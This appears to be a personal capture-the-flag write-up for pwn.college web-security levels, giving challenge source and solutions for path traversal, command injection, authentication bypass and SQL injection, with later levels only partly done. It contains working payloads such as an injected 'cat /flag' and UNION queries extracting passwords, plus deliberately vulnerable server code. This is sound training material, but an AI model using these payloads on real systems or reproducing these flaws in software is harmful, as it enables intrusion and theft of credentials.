# Level 1 - Path Traversal Vulnerability


```{md}
def level1(): 
    path = request.args.get("path") 
    assert path, "Missing `path` argument" 
    return (pathlib.Path(app.root_path) / path).read_text() 
```

```{sh}
> curl "http://challenge.localhost/?path=/flag"
pwn.college{wRT8kGDQ5IlFvynfnRpcP0mOZ7h.01N4MzMsMTOwEzW}
```

# Level 2 - Command Injection Vulnerability

```{md}
def level2():
    timezone = request.args.get("timezone", "UTC")
    return subprocess.check_output(f"TZ={timezone} date", shell=True, encoding="latin")
```

```{sh}
> requests.get('http://challenge.localhost:80/?timezone=tmp;cat /flag;').text
```

# Level 3 - Exploit Authentication row number

```{sh}

Way 1: usinf first if [NO]
> curl -X POST "http://challenge.localhost:80/?username=flag&password=*"
 
Way 2: using 2nd if
> curl "http://challenge.localhost:80/?user=1"
```

# Level 4 - Exploit SQL where clause

```{python}
import requests

url = "http://challenge.localhost:80"
data = {
        "username": '" or 1=1--',
        "password": "tmp"
}

response = requests.post(url, data = data)

print(response.text)
```

# Level 5 - Closing SQL clause with LIKE and UNION

- if `requests.arg.get()`, use `requests.post(url, params=data)`


```{python}
import requests

url = "http://challenge.localhost:80"
data = {
        "query": '"UNION SELECT password FROM users --"'
}

response = requests.post(url, params=data)

print(response.text)
```

# Level 6 - 

We don't know table name, so we have to get it first


Step 1:
```{sh}
import requests

url = "http://challenge.localhost:80"
data = {
        'query': '"UNION SELECT name from sqlite_master--'
}

res = requests.post(url, params=data)
print(res.text)
```

> table15220250475541310597

Step 2:

```{sh}
data = {
        'query': '"UNION SELECT password from table15220250475541310597--'
}
```

# Level 7 - Blind response

We can guess the username and password if the authentification is correct

```{sh}
def level7():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
        assert user, "Invalid `username` or `password`"

        session["user"] = int(user["rowid"])
        return redirect(request.path)

    if session.get("user"):
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```


# Level 8 - 

```{sh}
def level8():
    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(echo)

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(url)
            try:
                WebDriverWait(browser, 1).until(EC.alert_is_present())
            except TimeoutException:
                return "Failed to alert\n"
            else:
                return f"{flag}\n"

    return "Not Found\n", 404
```

# Level 9 - 

```{sh}

```


